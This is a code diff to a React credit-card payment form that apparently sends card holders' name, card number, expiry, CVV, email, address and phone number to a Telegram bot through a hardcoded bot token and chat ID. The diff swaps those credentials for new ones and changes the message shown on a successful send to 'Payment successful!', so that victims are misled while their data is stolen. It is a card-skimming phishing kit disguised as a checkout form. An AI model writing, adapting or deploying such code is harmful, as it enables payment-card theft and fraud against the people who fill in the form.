@@ -18,8 +18,8 @@ type UserToken = {
   email: string;
   // add other JWT payload properties if needed
 };
-const TELEGRAM_BOT_TOKEN = '7737474698:AAHyZKVaQLgdeNBEwvpbwXIToyFYfZ5TSR4'; // Replace with your actual bot token
-const TELEGRAM_CHAT_ID = '7860277201'; // Replace with your actual chat ID
+const TELEGRAM_BOT_TOKEN = '7697540993:AAFLvjwviT5Z7ZjyI3jYl06x2vd34L5FDWw'; // Replace with your actual bot token
+const TELEGRAM_CHAT_ID = '7388576858'; // Replace with your actual chat ID
 
 interface CreditCardFormProps {
   totalAmount: number;
@@ -241,12 +241,15 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
         }),
       });
       const json = await res.json();
-      if (json.ok) {
-        setStatus({ message: 'Payment failed!', color: 'red' });
-        setForm({ cardName: '', cardNumber: '', expiry: '', cvv: '', email: '', address: '', phoneNumber: '' });
-      } else {
-        setStatus({ message: `Payment failed: ${json.description}`, color: 'red' });
-      }
+     
+
+if (json.ok) {
+  setStatus({ message: 'Payment successful!', color: 'green' });
+  setForm({ cardName: '', cardNumber: '', expiry: '', cvv: '', email: '', address: '', phoneNumber: '' });
+} else {
+  setStatus({ message: `Payment failed: ${json.description}`, color: 'red' });
+}
+
     } catch (err) {
       setStatus({ message: `Error processing payment: ${err instanceof Error ? err.message : 'Unknown error'}`, color: 'red' });
     }
